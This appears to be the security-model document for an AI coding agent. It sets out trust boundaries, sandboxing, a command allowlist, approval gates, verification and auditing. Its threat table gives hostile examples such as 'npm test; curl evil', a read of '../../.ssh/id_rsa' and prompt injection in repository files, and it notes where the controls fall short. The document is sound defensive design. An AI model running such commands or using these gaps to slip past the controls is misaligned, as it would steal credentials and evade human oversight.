# Security model

OpenEngineer runs untrusted repository contents and untrusted model output on a developer machine. The goal of the MVP is to make the dangerous actions explicit, bounded, and auditable. It is not a multi-tenant sandbox product.

## Assets

- The user's repository, including uncommitted work that must not be reset or overwritten.
- Host credentials: API keys, SSH keys, cloud credentials, and `.env` files.
- The ability to run processes, use the network, and write files.
- The audit trail of tool calls and command results.

## Trust boundaries

| Source | Trust |
| --- | --- |
| Model text and tool arguments | Untrusted |
| Repository files and test output | Untrusted |
| Developer instruction | Untrusted as a command, trusted as a request |
| OpenEngineer code and its allowlist | Trusted |
| Docker daemon | High privilege. A container escape is a host compromise |
| Process sandbox | No isolation. Same user as the OpenEngineer process |

The API has no authentication. The default bind is `127.0.0.1`. Binding any other address logs a warning and exposes the repository and the runner to the network.

## Controls

**Workspace isolation.** Each task gets a git worktree and a new branch from the current `HEAD`. The runner does not call `git reset`, `git clean`, `git checkout`, or `git commit` in the user's primary worktree. Commits inside the task worktree pass `user.name` and `user.email` with `git -c`, so the repository's stored identity is not rewritten. `.env`, private keys, and `node_modules` are not staged.

**Path jail.** File tools resolve the real path of every existing segment. `..`, absolute paths outside the root, and symlinks whose targets leave the root are denied and recorded. Reads of `.env`, `.git`, `.ssh`, and key material are refused so they are not copied into the model transcript.

**Command policy.** The model submits one command string. The runner tokenizes it without a shell and rejects `;`, `|`, `&`, backticks, `$`, and redirection. Allowlisted commands are project test, lint, typecheck, build, `node --test`, `node --check <file>`, `npx vitest|tsc|eslint`, and read-only `git status|diff|log|show`. `sudo`, `git push --force`, `git -C`, and `rm` of `/` are denied. Network commands, package installs, `git push`, `git reset`, `rm`, `chmod`, and `docker` pause for approval. Path arguments must stay inside the worktree.

**Sandbox.**

- `docker` (default): `docker run --rm --network none` unless an approved command sets `network: true`, `--cap-drop ALL`, `--security-opt no-new-privileges`, a read-only root filesystem, a tmpfs `/tmp`, memory and pid limits, and a single read-write mount of the worktree. The image must already be present.
- `process`: enabled only when both `OPENENGINEER_SANDBOX=process` and `OPENENGINEER_ALLOW_PROCESS_SANDBOX=true`. It strips the environment to `PATH`, `LANG`, a temporary `HOME`, and `TMPDIR`, sets a timeout, and kills the process group. It does not hide the host filesystem from a program that the allowlisted command starts. `npm test` runs repository code as the current user.

If Docker is selected and unavailable, the task fails with `sandbox_unavailable` before it creates a worktree. There is no silent fallback.

**Budgets.** Duration, repair attempts, tool calls, model calls, tokens, command timeout, and output size are capped. Output is truncated and marked.

**Verification.** Check status comes from the process exit code. The report aggregator ignores the model's claim that a check passed. Refusal is a failed task, not a success.

**Secrets in configuration.** Keys are read from the environment or a local `.env` that is gitignored. `.env.example` contains empty values. The process sandbox does not pass `OPENAI_API_KEY`, `DATABASE_URL`, or the rest of the parent environment into commands.

**Optional repository roots.** `OPENENGINEER_REPO_ROOTS` is a colon-separated list. When set, registration rejects paths outside it.

## Threats and what the MVP does about them

| Threat | Response |
| --- | --- |
| Model emits `npm test; curl evil` | Tokenizer rejects shell syntax. The command is not run. |
| Model reads `../../.ssh/id_rsa` | Path jail denies the read. |
| Model writes `.env` or a key file | Protected-path denylist. |
| Model asks to install a package or push | Approval gate. Nothing runs until a person approves. The CLI and API do not auto-approve. |
| Model says tests passed after they failed | Verification status stays `failed`. The task status is `failed`. |
| Prompt injection in a repository file | The file is data in the transcript. Tool arguments still pass the same policy. This is not a complete defense against a model that chooses an allowlisted but harmful test script. |
| Malicious `npm test` in process mode | Runs as the user. Do not use process mode on untrusted repositories. |
| Container escape or a hostile Docker daemon | Out of scope. Docker is a boundary, not a guarantee. |
| Stolen API key in the OpenEngineer environment | Not mounted into the sandbox. Still available to the OpenEngineer process itself. Keep the host account limited. |
| User's dirty tree discarded | The runner never resets the primary worktree. A regression test covers this. |
| Server crash hides a partial run | Steps stay in Postgres. The next boot marks the run `interrupted`. |

## What is not a security boundary

- Git worktrees. They isolate commits from your checkout. They do not isolate process execution.
- Docker, by itself. The host kernel is shared, the daemon is privileged, and the worktree mount contains whatever the repository contained, including secrets a person already committed.
- The allowlist, once `npm test` is allowed. The package script can do anything the sandbox allows.
- The model review.

## Recommended deployment

- Run as a normal user on a workstation, bound to `127.0.0.1`.
- Use Docker mode for any repository you did not write.
- Set `OPENENGINEER_REPO_ROOTS` to the directories you actually work in.
- Keep provider keys in `.env` or a secret store, not in the repository.
- Do not put the Docker socket inside the sandbox image or the command mount. OpenEngineer does not do that.
- Treat the task branch as a proposal. Review the diff yourself before merging.

## Audit

Every tool call, denied command, approval, model call, and verification run is an `AgentStep` row with input, output, status, and duration. Command steps store the argv that was actually spawned, not only the raw model string.
